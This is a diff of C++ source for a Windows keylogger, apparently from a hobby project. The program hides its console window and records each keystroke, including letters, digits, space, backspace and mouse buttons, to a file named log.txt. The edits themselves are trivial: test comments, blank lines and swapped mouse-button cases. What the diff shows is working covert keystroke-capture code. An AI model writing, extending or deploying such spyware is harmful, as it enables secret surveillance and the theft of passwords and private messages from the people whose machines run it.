@@ -1,3 +1,4 @@
+#pragma comment(lib, "gdi32.lib")
 #include <windows.h>
 #include <stdio.h>
 #include <tchar.h>
@@ -11,7 +12,8 @@ using namespace std;
 LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
 int main()
 {
-
+//test
+//test
 HWND hWnd = GetConsoleWindow(); 
 ShowWindow( hWnd, SW_HIDE ); 
 //Hidding Console
@@ -30,7 +32,6 @@ return 0;
 //TESTING
 
 
-
 //TESTING
 LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
 {
@@ -43,8 +44,7 @@ ofstream myfile("log.txt", std::ios::app);
             switch( pKeyBoard->vkCode ) 
             {
 					//Buttons	
-				
-				case VK_MBUTTON:
+				case VK_LBUTTON:
 					myfile<<"\n button \n";
 				break;
             	case VK_TAB:
@@ -58,9 +58,6 @@ ofstream myfile("log.txt", std::ios::app);
 				case VK_XBUTTON1:
 					myfile<<"XBUTTON";
 				break;
-				case VK_LBUTTON:
-					myfile<<"\n Click \n";
-				break;	
 				case VK_SPACE:
 					myfile<<"\n";
 				break;
@@ -70,6 +67,7 @@ ofstream myfile("log.txt", std::ios::app);
 				case VK_BACK:
 					myfile<<"\n Backspace \n";
 				break;
+				
 					//Letters
                    case 0x41:
                 myfile<<"A";
@@ -149,6 +147,7 @@ ofstream myfile("log.txt", std::ios::app);
                     case 0x5A:
                 myfile<<"Z";
                 break;
+                
                 	//Numbers
                 	case 0x30:
                 myfile<<"0 \n";
